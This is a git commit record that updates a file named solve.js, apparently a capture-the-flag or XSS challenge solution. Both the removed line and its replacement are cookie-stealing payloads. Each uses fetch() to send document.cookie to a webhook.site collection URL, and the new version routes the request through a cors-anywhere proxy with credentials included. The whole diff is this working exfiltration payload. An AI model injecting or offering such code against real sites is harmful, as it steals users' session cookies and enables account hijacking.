b6047acbc88d71c5bbff03e4ff54ad1ae0b349ba
Theory <51336409+7h30ry@users.noreply.github.com>
2025-05-03 12:58:57 +0100

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,1 +1,7 @@
-fetch("https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884/?c=" + document.cookie);
+fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884?c=' + document.cookie, {
+  method: 'GET',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  credentials: 'include'
+});
